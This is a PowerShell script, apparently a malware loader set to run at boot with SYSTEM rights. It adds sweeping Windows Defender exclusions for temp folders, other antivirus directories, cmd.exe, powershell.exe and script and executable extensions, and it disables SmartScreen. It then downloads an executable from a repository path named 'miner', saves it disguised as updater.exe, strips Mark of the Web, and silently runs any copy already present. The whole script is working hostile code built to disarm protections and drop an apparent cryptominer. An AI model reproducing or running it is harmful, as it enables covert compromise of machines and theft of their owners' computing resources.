Start-Sleep -Seconds 15

$logPath = "C:\Windows\Temp\boot_execution_log.txt"
$logDirectory = Split-Path -Path $logPath -Parent

if (-not (Test-Path -Path $logDirectory)) {
    New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
}

Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Running under SYSTEM account."

function Is-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}
if (Is-Admin) {
    Add-Content -Path $logPath -Value "Confirmed: Script is running with Administrator (SYSTEM) privileges."
} else {
    Add-Content -Path $logPath -Value "WARNING: Script is NOT running with Administrator privileges."
}

$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe"
$payloadPath = "C:\Windows\Temp\updater.exe"

Add-Content -Path $logPath -Value "Checking for existing updater.exe at $payloadPath."

if (Test-Path -Path $payloadPath) {
    Add-Content -Path $logPath -Value "Existing updater.exe found at $payloadPath."
    
    if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
        Add-Content -Path $logPath -Value "Warning: Existing file does not have .exe extension."
    } else {
        Add-Content -Path $logPath -Value "File exists at $payloadPath with .exe extension."
    }

    $existingSize = (Get-Item -Path $payloadPath).Length
    Add-Content -Path $logPath -Value "Existing file size: $existingSize bytes."

    try {
        Unblock-File -Path $payloadPath -ErrorAction Stop
        Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
    } catch {
        Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
    }

    try {
        Add-Content -Path $logPath -Value "Attempting to execute existing payload..."
        Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
        Add-Content -Path $logPath -Value "Existing payload executed successfully."
    } catch {
        Add-Content -Path $logPath -Value "Execution failed: $_"
        throw "Failed to execute existing payload."
    }
} else {
    Add-Content -Path $logPath -Value "No existing updater.exe found at $payloadPath. Proceeding with installation process without execution."

    Add-Content -Path $logPath -Value "Waiting for Windows Defender service to be fully ready..."
    $maxAttempts = 20
    $delayBetweenChecks = 5

    for ($i = 0; $i -lt $maxAttempts; $i++) {
        try {
            $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
            $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
            if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
                Add-Content -Path $logPath -Value "Windows Defender service is running and Real-time Protection is enabled."
                break
            }
        } catch {
            Add-Content -Path $logPath -Value "Attempt $($i+1): Defender service not yet found or ready. Error: $_. Waiting..."
        }
        Start-Sleep -Seconds $delayBetweenChecks
        if ($i -eq ($maxAttempts - 1)) {
            Add-Content -Path $logPath -Value "WARNING: Max attempts reached. Defender may not be fully ready. Proceeding with exclusions."
        }
    }
    Add-Content -Path $logPath -Value "Finished adaptive wait. Proceeding with Defender exclusions."

    Add-Content -Path $logPath -Value "Attempting to add Windows Defender exclusions."

    $exclusionsPaths = @(
        "C:\Users\Public\SystemLib",
        "C:\Windows\Temp\updater.exe",
        "C:\ProgramData\WinKit",
        "C:\Windows\Temp\*",
        "C:\ProgramData\Microsoft\Windows\Temp",
        "C:\Users\*\AppData\Local\Temp",
        "C:\Windows\System32\Tasks",
        "C:\Windows\SysWOW64\Tasks",
        "C:\Program Files\McAfee",
        "C:\Program Files\Symantec",
        "C:\Program Files\Kaspersky Lab",
        "C:\Program Files\Avast Software",
        "C:\Program Files\AVG"
    )

    $exclusionsProcesses = @(
        "updater.exe",
        "cmd.exe",
        "powershell.exe"
    )

    $exclusionsExtensions = @(
        "exe",
        "bat",
        "cmd",
        "ps1",
        "vbs",
        "js"
    )

    foreach ($excl in $exclusionsPaths) {
        try {
            $currentExclusions = Get-MpPreference
            $pathExists = ($currentExclusions.ExclusionPath | Where-Object { $_ -eq $excl }) -ne $null
            if (-not $pathExists) {
                Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
                Add-Content -Path $logPath -Value "Exclusion path added: $excl"
            } else {
                Add-Content -Path $logPath -Value "Exclusion path already exists: $excl"
            }
        } catch {
            Add-Content -Path $logPath -Value "Failed to add exclusion path: $excl - Error: $_"
        }
    }

    foreach ($excl in $exclusionsProcesses) {
        try {
            $currentExclusions = Get-MpPreference
            $processExists = ($currentExclusions.ExclusionProcess | Where-Object { $_ -eq $excl }) -ne $null
            if (-not $processExists) {
                Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
                Add-Content -Path $logPath -Value "Exclusion process added: $excl"
            } else {
                Add-Content -Path $logPath -Value "Exclusion process already exists: $excl"
            }
        } catch {
            Add-Content -Path $logPath -Value "Failed to add exclusion process: $excl - Error: $_"
        }
    }

    foreach ($excl in $exclusionsExtensions) {
        try {
            $currentExclusions = Get-MpPreference
            $extensionExists = ($currentExclusions.ExclusionExtension | Where-Object { $_ -eq $excl }) -ne $null
            if (-not $extensionExists) {
                Add-MpPreference -ExclusionExtension $excl -ErrorAction SilentlyContinue
                Add-Content -Path $logPath -Value "Exclusion extension added: $excl"
            } else {
                Add-Content -Path $logPath -Value "Exclusion extension already exists: $excl"
            }
        } catch {
            Add-Content -Path $logPath -Value "Failed to add exclusion extension: $excl - Error: $_"
        }
    }

    Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."

    Add-Content -Path $logPath -Value "Attempting to disable SmartScreen and fetch .exe payload from $payloadUrl without execution."

    try {
        $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
        try {
            Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
            Add-Content -Path $logPath -Value "SmartScreen disabled successfully."
        } catch {
            Add-Content -Path $logPath -Value "Failed to disable SmartScreen: $_"
        }

        $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
        if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
            Add-Content -Path $logPath -Value "Confirmed: SmartScreen is disabled."
        } else {
            Add-Content -Path $logPath -Value "SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
        }

        if (-not (Test-Path -Path (Split-Path -Path $payloadPath -Parent))) {
            New-Item -ItemType Directory -Path (Split-Path -Path $payloadPath -Parent) -Force | Out-Null
            Add-Content -Path $logPath -Value "Created payload directory: $(Split-Path -Path $payloadPath -Parent)."
        }

        Add-Content -Path $logPath -Value "Downloading .exe payload from $payloadUrl using Invoke-WebRequest..."
        $webResponse = Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -PassThru
        Add-Content -Path $logPath -Value "EXE payload downloaded to $payloadPath. Content-Type: $($webResponse.Headers['Content-Type'])"

        $downloadedSize = (Get-Item -Path $payloadPath).Length
        Add-Content -Path $logPath -Value "Downloaded file size: $downloadedSize bytes."

        if (-not (Test-Path -Path $payloadPath)) {
            throw "Downloaded file not found at $payloadPath."
        }
        if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
            Add-Content -Path $logPath -Value "Warning: Downloaded file does not have .exe extension."
        }
        Add-Content -Path $logPath -Value "File exists at $payloadPath with .exe extension."

        try {
            Unblock-File -Path $payloadPath -ErrorAction Stop
            Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
        } catch {
            Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
        }

        Add-Content -Path $logPath -Value "Payload downloaded successfully but not executed, as per configuration."

    } catch {
        Add-Content -Path $logPath -Value "Failed to fetch payload from $payloadUrl. Error: $_"
    }
}

Add-Content -Path $logPath -Value "Script execution finished at $(Get-Date)."
